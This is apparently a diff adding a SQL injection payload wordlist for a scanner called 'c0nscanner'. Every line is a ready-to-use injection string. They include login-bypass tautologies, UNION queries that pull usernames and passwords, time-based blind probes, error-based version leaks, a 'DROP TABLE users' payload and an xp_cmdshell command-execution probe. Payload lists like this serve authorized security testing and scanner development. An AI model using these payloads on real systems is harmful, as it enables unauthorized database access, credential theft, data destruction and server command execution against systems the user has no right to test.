@@ -1,0 +1,57 @@
+# sql injection payloads - c0nscanner
+# error-based
+'
+"
+`
+')
+")
+`)
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+" OR "1"="1" --
+' OR '1'='1' #
+" OR "1"="1" #
+' OR 1=1 --
+" OR 1=1 --
+' OR 1=1 #
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+1 OR 1=1
+1' OR '1'='1
+admin'--
+admin' #
+1; DROP TABLE users--
+'; WAITFOR DELAY '0:0:5'--
+1'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+1'; SELECT SLEEP(5)--
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1' AND 1=CONVERT(int,(SELECT @@version))--
+1' AND extractvalue(1,concat(0x7e,version()))--
+1' AND updatexml(1,concat(0x7e,version()),1)--
+1 AND 1=1
+1 AND 1=2
+-1 OR 1=1
+-1' OR 1=1--
+1' GROUP BY 1--
+1' HAVING 1=1--
+' OR ''='
+" OR ""="
+' OR 'x'='x
+' AND 'x'='y
+' OR 1=1 LIMIT 1--
+'; EXEC xp_cmdshell('whoami')--
+' UNION ALL SELECT NULL,NULL,NULL--
